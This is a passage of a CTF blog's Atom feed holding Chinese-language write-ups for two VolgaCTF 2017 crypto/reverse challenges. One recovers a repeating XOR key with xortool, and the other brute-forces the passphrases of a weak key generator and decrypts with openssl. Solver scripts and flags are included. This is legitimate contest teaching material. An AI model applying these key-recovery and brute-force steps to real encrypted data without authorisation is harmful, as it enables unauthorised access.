&lt;li&gt;flag’s location is &lt;strong&gt;opt&lt;/strong&gt;imal&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - PyCrypto 150</title>
    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-PyCrypto-150/"/>
    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-PyCrypto-150/</id>
    <published>2017-03-31T10:12:00.000Z</published>
    <updated>2017-03-31T11:00:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Crypto + Reverse<br>Point: 150<br>Description:<br>This crypto algorithm uses a huge key and it’s implementation is not so trivial to reverse engineer. Isn’t it wonderful?<br><a href="https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/encrypt.py" target="_blank" rel="external">encrypt.py</a><br><a href="https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/flag.enc" target="_blank" rel="external">flag.enc</a><br><a href="https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/pycryptography.so" target="_blank" rel="external">pycryptography.so</a></p>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>先看看encrypt.py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> pycryptography <span class="keyword">import</span> encrypt</div><div class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</div><div class="line">        <span class="comment"># 160 bits security!</span></div><div class="line">        enc = encrypt(flag.encode(), os.urandom(<span class="number">20</span>))</div><div class="line">        f.write(enc)</div></pre></td></tr></table></figure></p>
<p>看到<code>160 bits security</code>得知key是20bytes。<br>再來用IDA pro看了一下<code>pycryptography.so</code>，嗯…放棄Orz<br>直接嘗試使用pycryptography的encrypt看看：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; from pycryptography import encrypt</div><div class="line">&gt;&gt;&gt; text = 'a' * <span class="number">40</span></div><div class="line">&gt;&gt;&gt; key = 'a' * <span class="number">20</span></div><div class="line">&gt;&gt;&gt; encrypt(text.encode(), key.encode())</div><div class="line">b'\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>'</div><div class="line">&gt;&gt;&gt; key = 'b' * <span class="number">20</span></div><div class="line">&gt;&gt;&gt; encrypt(text.encode(), key.encode())</div><div class="line">b'\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>\<span class="keyword">x</span><span class="number">03</span>'</div><div class="line">&gt;&gt;&gt; key = '<span class="keyword">c</span>' * <span class="number">20</span></div><div class="line">&gt;&gt;&gt; encrypt(text.encode(), key.encode())</div><div class="line">b'\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">02</span>'</div></pre></td></tr></table></figure></p>
<p>依結果來看，<code>encrypt()</code>就只是在做<code>xor</code>而已。<br>直接把<code>flag.enc</code>丟<code>xortool</code>看看：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ xortool flag.enc -l 20 -c 20</div><div class="line">1 possible key(s) of length 20:</div><div class="line"><span class="symbol">\x</span>d1<span class="symbol">\x</span>ffc<span class="symbol">\x</span>f7<span class="symbol">\x</span>c8u<span class="symbol">\x</span>d8<span class="symbol">\x</span>c4<span class="symbol">\x</span>1a<span class="symbol">\x</span>84<span class="symbol">\x</span>ca$[f<span class="symbol">\x</span>0c<span class="symbol">\x</span>1f<span class="symbol">\x</span>c6<span class="symbol">\x</span>e2<span class="symbol">\x</span>cc<span class="symbol">\x</span>ea</div><div class="line">Found 1 plaintexts with 95.0<span class="variable">%+ printable characters</span></div><div class="line">See files filename-key.csv, filename-char_used-perc_printable.csv</div></pre></td></tr></table></figure></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">cat</span> xortool_out/0.<span class="keyword">out</span></div><div class="line">ol3<span class="variable">$CTF</span>&#123;@<span class="keyword">m</span> _is_Pad<span class="keyword">Ma</span>:&lt;_Tim s_@d_Mi$$mek8</div><div class="line">Gil'er1 Vernamewa'ean A&amp;TeBell <span class="keyword">La</span>'s 1+gine r 2ho, <span class="keyword">in</span> t91ci inv nt <span class="keyword">d</span> <span class="keyword">an</span> ad!it=3e po)ya)phabeti&amp; s 7eam &amp;ip-er and )at17 co-,nv nted aneau *mate! o+<span class="keyword">e</span>-time 5adt&amp;iphe7. ernam p7op;6ed aete)eprinte7 c=5her ,<span class="keyword">n</span> 2hich a 5re<span class="string">",ousl&lt; p7epared .eyxekepteonepaper t$pexeis c*mb,ned cha7ac  r byech$racter 2it&lt;ethe 5la,ntext m ss5"</span><span class="keyword">e</span> toepr*duce th  c=5hert xtk This a7e  -<span class="keyword">e</span> fu+da(entals *f &lt;*w <span class="keyword">on</span> -t,me pad 2or?6.</div><div class="line"><span class="keyword">On</span> -t,me pad ,s 5eway *f  ncrypti+<span class="keyword">g</span> 9 ssag s 2hich isedo:  <span class="keyword">by</span> ORhing eac- p8<span class="variable">$inte</span>=t 'yte of (es'<span class="variable">$ge</span> y*<span class="keyword">u</span> 2ant to  nc&amp;&lt;pt w,thea key b&lt;tet#rom $ k y strea( w&lt;,ch i6 <span class="keyword">l</span>*ng <span class="keyword">as</span> t-<span class="keyword">e</span> 9 ssag  i1self.  f  -<span class="keyword">e</span> ke&lt; i6 truly 7an0*<span class="keyword">m</span>, i6 a1 least <span class="variable">$s</span> 8*ng a6 t-<span class="keyword">e</span> plain1ex i is +ev r reuse! i:ewhol  o7 <span class="keyword">in</span> par1, 5+<span class="keyword">d</span> iseke5t compl te8&lt; sec7eti then t-<span class="keyword">e</span> &amp; sult,ngeciphert xtt2ill '<span class="keyword">e</span> ,mpossib)<span class="keyword">e</span>  * dec7yp1 or bre<span class="variable">$k</span>.this (ak s the o+<span class="keyword">e</span>- ,me p<span class="variable">$d</span> ,nformat,ony1heor ti&amp;ally <span class="keyword">se</span>&amp;ur1ewhic- <span class="keyword">m</span> ans tha1 w1ecan )ea7n <span class="keyword">no</span> <span class="keyword">in</span>#or9<span class="variable">$tioneab</span>*ut the *ri3,nal (es6age (<span class="keyword">ap</span><span class="variable">$rtt</span>#rom ,t'6 lengthl <span class="keyword">g</span>=3en t-<span class="keyword">e</span>  ncrypte! m16sagek E3erythin<span class="string">" s1 ms p rf ct righ1? 0t wh&lt; d* we nee! a8) thi6 m*dern ci5he&amp;6 the+? hy do w  n1 d AE w-en ther  i'ea "</span>p rf <span class="keyword">ct</span><span class="string">" cip-erxefres- f7om 1917z W&lt; re'seth  catch?OOn1htimeepa! proble(s:tn th or&lt;, this &amp;ip&lt; r isere$lly sec0rexebut ,n 5racticei t&lt; re a7e #ew majo7 d&amp;$wbac.s.eFirst, 1het.ey n ed6 to be 1ru8&lt; ran!omk You mi"</span>htt1hink "o what,eth17e isea 7and() Cefu:&amp;tioneth<span class="variable">$t</span> giveseust7ando( n0mbers, 2e 7<span class="variable">$n</span> <span class="keyword">us</span>  t-at to <span class="keyword">g</span> ne&amp;<span class="variable">$te</span> o0r .ey stre<span class="variable">$m</span>!vk <span class="keyword">In</span> #ac1, the r<span class="variable">$nd</span>|<span class="keyword">l</span> C f0nc1ion is $ p' udor<span class="variable">$nd</span>*<span class="keyword">m</span> <span class="keyword">gener</span><span class="variable">$to</span>&amp;ewhic- o+ly give6 s1 ming)y 7andom n0mb17s, i1 w,ll loopeaf  r <span class="keyword">so</span>(<span class="keyword">e</span> +umber o# o!1putsean! its ou1pu ecan '<span class="keyword">e</span> 5redicte! w&lt;,ch <span class="keyword">m</span><span class="variable">$ke6</span> the fu+<span class="keyword">ct</span>=*<span class="keyword">n</span> un7el,able fo7 s1&amp;urit&lt; p0rposes.eTh17e ar  <span class="keyword">m</span>*re impl me:1atio+s *f rando( f!+ctio+s mpseudor<span class="variable">$nd</span>;( <span class="keyword">gen</span> ra1ors) th<span class="variable">$t</span> 57e <span class="keyword">us</span> <span class="keyword">d</span> ,<span class="keyword">n</span> secur,tyt'ut Iewi)<span class="keyword">l</span> not <span class="keyword">g</span>* i:1o th<span class="variable">$t</span> +ow, onl&lt; t&lt;,ng t* r member ,s  -at t7ueerandomn sst,s ve7y -ard to <span class="variable">$ch</span>= ve. </div><div class="line">neesite th<span class="variable">$t</span> '1ateseth<span class="variable">$t</span> can <span class="keyword">g</span> ne&amp;<span class="variable">$te</span> t7ueerandom +um6 rs i6 RNDOM.OR, =1s ra+<span class="keyword">do</span>(ness co(<span class="keyword">est</span>#rom <span class="variable">$tm</span>*sphericeno=6e. A+ot-er <span class="keyword">prob</span>)emt,s th<span class="variable">$t</span> 1he key +ee06 to '<span class="keyword">e</span> <span class="variable">$s</span> long <span class="variable">$s</span>  -<span class="keyword">e</span> me6sa<span class="string">"e itsel#,  -is m$ke6 it har! t;euse #orevery lo+g 9 ssag s 'ecause ,t  $kes )on"</span> to <span class="keyword">gen</span> ra   theeke&lt;s. I wi)<span class="keyword">l</span> '-ow y*<span class="keyword">u</span> <span class="variable">$n</span> examp)<span class="keyword">e</span> ;# wha1 c<span class="variable">$n</span> go wr*ngt2hen &lt;oueget laz&lt; a:! useeth  same k y  * enc7yp1 many <span class="keyword">m</span> ss5"es.</div><div class="line">ak <span class="keyword">n</span> from:eht 5s:<span class="comment">//2hi1ehatjou7ne-kword5re6s.com/2u15&#123;u8/12jma+y-time-5ady$ttac./</span></div></pre></td></tr></table></figure>
<p>可以看到解出來的文字有些是正確的，有些則像是亂碼或不可視字元，顯然解密用的key: <code>d1 ff 63 f7 c8 75 d8 c4 1a 84 ca 24 5b 66 c 1f c6 e2 cc ea</code> 是有些問題的。不過只要用一些已知的明文字詞來做修正就行了，譬如開頭為<code>VolgaCTF{</code>，還有後面的網址應該有<code>https</code>跟<code>wordpress</code>。</p>
<p>我用<code>xortool-xor</code>把<code>flag.enc</code>檔案跟key做xor運算來解密，經過幾次xor測試後，最後得到修正後的key為 <code>94 ff 63 a3 8d 75 d8 c4 1a c1 ca 24 1e 66 0c 1f c6 e2 cc ea</code></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xortool-<span class="keyword">xor</span> -f flag.enc -h <span class="number">94</span>ff<span class="number">63</span>a<span class="number">38</span>d<span class="number">75</span>d<span class="number">8</span><span class="keyword">c</span><span class="number">41</span>ac<span class="number">1</span>ca<span class="number">241e660</span><span class="keyword">c</span><span class="number">1</span>fc<span class="number">6e2</span>ccea</div></pre></td></tr></table></figure>
<p>解出來的plaintext：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">VolgaCTF&#123;N@me_is_Pad_Many_Times_P@d_Mi$$_me?&#125;</div><div class="line">Gilbert Vernam was an AT&amp;T Bell Labs engineer who, <span class="keyword">in</span> <span class="number">1917</span>, invented an additive polyalphabetic stream cipher <span class="keyword">and</span> later co-invented an automated one-time pad cipher. Vernam proposed a teleprinter cipher <span class="keyword">in</span> which a previously prepared key, kept <span class="literal">on</span> paper tape, <span class="keyword">is</span> combined character <span class="keyword">by</span> character <span class="keyword">with</span> the plaintext message <span class="keyword">to</span> produce the ciphertext. This are the fundamentals <span class="keyword">of</span> how one-time pad works.</div><div class="line">One-time pad <span class="keyword">is</span> a way <span class="keyword">of</span> encrypting messages which <span class="keyword">is</span> done <span class="keyword">by</span> XOR-ing each plaintext byte <span class="keyword">of</span> message you want <span class="keyword">to</span> encrypt <span class="keyword">with</span> a key byte <span class="keyword">from</span> a key stream which <span class="keyword">is</span> long as the message itself.  If the key <span class="keyword">is</span> truly random, <span class="keyword">is</span> at least as long as the plaintext, <span class="keyword">is</span> never reused <span class="keyword">in</span> whole <span class="keyword">or</span> <span class="keyword">in</span> part, <span class="keyword">and</span> <span class="keyword">is</span> kept completely secret, <span class="keyword">then</span> the resulting ciphertext will be impossible <span class="keyword">to</span> decrypt <span class="keyword">or</span> <span class="keyword">break</span>. This makes the one-time pad information-theoretically secure which means <span class="literal">that</span> we can learn <span class="literal">no</span> information about the original message (apart <span class="keyword">from</span> <span class="literal">it</span><span class="string">'s length) given the encrypted message. Everything seems perfect right? But why do we need all this modern ciphers then? Why do we need AES when there is a "perfect" cipher, fresh from 1917? Where'</span>s the <span class="keyword">catch</span>?</div><div class="line">One-time pad problems: In theory, <span class="keyword">this</span> cipher <span class="keyword">is</span> really secure, but <span class="keyword">in</span> practice, there are few major drawbacks. First, the key needs <span class="keyword">to</span> be truly random. You might think: <span class="string">"So what, there is a rand() C function that gives us random numbers, we can use that to generate our key stream!"</span>. In fact, the rand() C <span class="keyword">function</span> <span class="keyword">is</span> a pseudorandom generator which only gives seemingly random numbers, <span class="literal">it</span> will <span class="keyword">loop</span> after some number <span class="keyword">of</span> outputs <span class="keyword">and</span> its output can be predicted which makes the <span class="keyword">function</span> unreliable <span class="keyword">for</span> security purposes. There are more implementations <span class="keyword">of</span> random functions (pseudorandom generators) <span class="literal">that</span> are used <span class="keyword">in</span> security but I will <span class="keyword">not</span> go into <span class="literal">that</span> now, only thing <span class="keyword">to</span> remember <span class="keyword">is</span> <span class="literal">that</span> <span class="literal">true</span> randomness <span class="keyword">is</span> very hard <span class="keyword">to</span> achieve. One site <span class="literal">that</span> states <span class="literal">that</span> can generate <span class="literal">true</span> random numbers <span class="keyword">is</span> RANDOM.ORG, its randomness comes <span class="keyword">from</span> atmospheric noise. Another problem <span class="keyword">is</span> <span class="literal">that</span> the key needs <span class="keyword">to</span> be as long as the message itself, <span class="keyword">this</span> makes <span class="literal">it</span> hard <span class="keyword">to</span> use <span class="keyword">for</span> very long messages because <span class="literal">it</span> takes long <span class="keyword">to</span> generate the keys. I will show you an example <span class="keyword">of</span> what can go wrong <span class="keyword">when</span> you get lazy <span class="keyword">and</span> use the same key <span class="keyword">to</span> encrypt many messages.</div><div class="line">Taken from: https:<span class="regexp">//whitehatjourney.wordpress.com/2015/08/12/many-time-pad-attack/</span></div></pre></td></tr></table></figure></p>
<p>Flag: <code>VolgaCTF{N@me_is_Pad_Many_Times_P@d_Mi$$_me?}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Crypto + Reverse&lt;br&gt;Point: 150&lt;br&gt;Description:&lt;br&gt;This crypto algorithm uses a huge key and it’s implementation is not so trivial to reverse engineer. Isn’t it wonderful?&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/encrypt.py&quot;&gt;encrypt.py&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/flag.enc&quot;&gt;flag.enc&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/pycryptography.so&quot;&gt;pycryptography.so&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
      <category term="Crypto" scheme="https://andyw330.github.io/tags/Crypto/"/>
    
      <category term="Reverse" scheme="https://andyw330.github.io/tags/Reverse/"/>
    
      <category term="Xor" scheme="https://andyw330.github.io/tags/Xor/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - KeyPass 100</title>
    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-KeyPass-100/"/>
    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-KeyPass-100/</id>
    <published>2017-03-31T05:10:00.000Z</published>
    <updated>2017-03-31T07:49:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Crypto + Reverse<br>Point: 100<br>Description:<br>For reasons unknown an amature cryptographer wrote an application to generate “strong encryption keys”. One of these keys was used to encrypt a tar archive with the flag. They used openssl command line util with -aes-128-cbc. Could you please get the flag? It shouldn’t take much time…<br><a href="https://quals.2017.volgactf.ru/files/v5nxjyisi75bjdnc9nrbiocmxjvosk2v/flag.zip.enc" target="_blank" rel="external">flag.zip.enc</a><br><a href="https://quals.2017.volgactf.ru/files/v5nxjyisi75bjdnc9nrbiocmxjvosk2v/keypass" target="_blank" rel="external">keypass</a></p>
<p><strong>Hints</strong><br><figure class="highlight lsl"><table><tr><td class="code"><pre><div class="line">$ openssl</div><div class="line">OpenSSL&gt; version</div><div class="line">OpenSSL <span class="number">1.1</span><span class="number">.0</span>e  <span class="number">16</span> Feb <span class="number">2017</span></div></pre></td></tr></table></figure></p>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>先是把keypass丟進IDA pro看看，看起來要解析似乎有點麻煩，之後就直接跑keypass看看了。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./keypass</div><div class="line">Usage:</div><div class="line">	keypass <span class="symbol">&lt;pass_phrase&gt;</span></div><div class="line">		<span class="symbol">&lt;pass_phrase&gt;</span>  that one secret phrase <span class="keyword">only</span> you could have come <span class="keyword">up</span> with</div></pre></td></tr></table></figure>
<p>看來程式是會吃一個argument當pass_phrase，之後把pass_phrase轉變成要丟進openssl的passphrase。<br>稍微測測看幾個pass_phrase：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>./keypass a</div><div class="line">cq5<span class="variable">$%</span>IN1MLc(&gt;F&lt;Ol</div><div class="line"></div><div class="line"><span class="variable">$ </span>./keypass aa</div><div class="line">BWf81zF%SdkxL*jL.</div><div class="line"></div><div class="line"><span class="variable">$ </span>./keypass aaa</div><div class="line">cq5<span class="variable">$%</span>IN1MLc(&gt;F&lt;Ol</div><div class="line"></div><div class="line"><span class="variable">$ </span>./keypass aaaa</div><div class="line">BWf81zF%SdkxL*jL.</div><div class="line"></div><div class="line"><span class="variable">$ </span>./keypass abab</div><div class="line">BWf81zF%SdkxL*jL.</div><div class="line"></div><div class="line"><span class="variable">$ </span>./keypass ababa</div><div class="line">cq5<span class="variable">$%</span>IN1MLc(&gt;F&lt;Ol</div></pre></td></tr></table></figure></p>
<p>歸納一下：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">keypass<span class="comment">('a')</span> = keypass<span class="comment">('aaa')</span> = keypass<span class="comment">('ababa')</span> = cq<span class="number">5</span>$<span class="meta">%</span>I<span class="symbol">N1</span>MLc<span class="comment">(&gt;F&lt;Ol</span></div><div class="line">keypass('aa') = keypass<span class="comment">('aaaa')</span> = keypass<span class="comment">('abab')</span> = BWf<span class="number">81</span>zF<span class="meta">%</span>SdkxL*jL.</div></pre></td></tr></table></figure></p>
<p>咦！看起來似乎是把字串內的所有字做了xor運算，再根據運算結果輸出一個passphrase，再來驗證一下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">ord</span><span class="params">(<span class="string">'a'</span>)</span></span> ^ ord(<span class="string">'b'</span>) = <span class="number">3</span></div><div class="line"></div><div class="line">$ ./keypass ab</div><div class="line">s+Tq4OY=dfK:<span class="number">9</span>+.(,</div><div class="line"></div><div class="line">$ ./keypass $(python -c <span class="string">"print chr(3)"</span>)</div><div class="line">s+Tq4OY=dfK:<span class="number">9</span>+.(,</div><div class="line"></div><div class="line"><span class="function"><span class="title">keypass</span><span class="params">(<span class="string">'ab'</span>)</span></span> = keypass(chr(<span class="number">3</span>))</div></pre></td></tr></table></figure></p>
<p>驗證成功！所以只要跑<code>keypass(chr(0)) ~ keypass(chr(255))</code>，就可以窮舉出所有的key了！<br>先建個passphrase_list出來：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">for</span> (( i = 0; i &lt; 256; i++ )); <span class="keyword">do</span></div><div class="line">	./keypass $(python -c <span class="string">"print chr(<span class="variable">$&#123;i&#125;</span>)"</span>) &gt;&gt; passphrase_list.txt</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<p>再來寫個python script把每個passphrase都拿去解密看看：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE, Popen</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'passphrase_list.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> f.readlines():</div><div class="line">        cmd = <span class="string">'openssl enc -aes-128-cbc -d -in flag.zip.enc -md sha256 -k \''</span> + key.strip() + <span class="string">'\''</span></div><div class="line">        p = Popen(cmd, stdout=PIPE, stdin=PIPE, stderr=PIPE, shell=<span class="keyword">True</span>)</div><div class="line">        output, err = p.communicate()</div><div class="line">        <span class="keyword">if</span> <span class="string">'bad decrypt'</span> <span class="keyword">not</span> <span class="keyword">in</span> str(err):</div><div class="line">            print(key)</div><div class="line">            <span class="keyword">with</span> open(<span class="string">'flag.zip'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> flagfile:</div><div class="line">                flagfile.write(output)</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>找到正確的passphrase是<code>\M)R&lt;.DDe/:;d&gt;JZP</code>，得到<code>flag.zip</code>。下<code>unzip flag.zip</code>，得到<code>flag.txt</code>。<br>Flag: <code>VolgaCTF{L0ve_a11_trust_@_few_d0_not_reinvent_the_wh33l}</code></p>
